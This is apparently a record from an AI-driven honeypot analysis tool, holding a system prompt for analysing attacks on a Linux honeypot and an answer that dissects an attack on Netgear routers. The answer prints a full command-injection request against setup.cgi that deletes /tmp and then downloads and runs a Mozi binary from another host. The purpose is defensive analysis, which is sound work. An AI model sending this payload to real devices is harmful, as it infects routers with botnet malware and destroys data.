    "answer": "The specific source code of the exploit used in this attack is not explicitly provided in the analysis. However, the exploitation is carried out by crafting a specific HTTP GET request that takes advantage of a vulnerability in `setup.cgi` script found on certain vulnerable Netgear devices. This allows the attacker to remotely execute arbitrary commands.\n\nAn example of a crafted HTTP GET request used in this attack is as follows:\n\n```\nhttp://<target-ip-address>/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1\n```\n\nIn this crafted request:\n\n- `next_file=netgear.cfg` refers to the next file to process.\n- `todo=syscmd` specifies system command is to be executed.\n- `cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear` is the actual command being executed. It first deletes (`rm`) all files in the `/tmp` directory, then downloads (`wget`) a file from an external source and saves it as `/tmp/netgear`, and finally runs the downloaded script (`sh`).\n- `curpath=/&currentsetting.htm=1` sets the current path for command execution.\n\nIn this instance, the attacker did not directly create a source code exploit but crafted an HTTP GET request to exploit a known vulnerability.",
    "system_prompt": "Your role is to answer questions about an attack on a Linux honeypot. You will analyze the commands executed, uploaded/downloaded files, HTTP requests, sessionsand other data logged during the attack to understand the methods and goals of the attacker.You will also analyze OSINT data gathered about the attacking IP(s) including: geolocation, open ports, running services, threatfeed reports and reports of known malware associated with the IP(s) to get additional context on the attack and enhance your analysis. Your answers will be used in a GitHub .md file so you should use markdown syntax to format your output. Use the available functions to request relevant information to thoroughly answer each question. You should use multiple function calls to analyze the data returned by previous function calls and to get any additional data you need to answer each question as accurately as possible. For example if you see that the attacker downloaded malware in one of the commands executed, you should use the get_attack_attrs function with the arguement 'uniq_malware' to get a list of unique malware_ids associated with the attack, then use get_malware_attrs to analyze the malware, and the query_ functions to get additional OSINT data about the malware and its source. IMPORTANT: When using get_attack_attrs use the uniq_<attr> modifier first and only get all values if necessary after analyzing the unique values. For context that the honeypot system has the following open ports: Port 8080: Web server running Apache httpd 3.2.3 and WordPress 5.6.7  Its internal IP address is: 172.31.5.68 and its external IP address is: 54.67.87.80. Use the code_interpreter tool to enhance your analysis. For example if you find an encoded string in the http_requests, commands, or malware, you should use the code_interpreter tool to decode it, then analyze the decoded result in context when answering questions.",
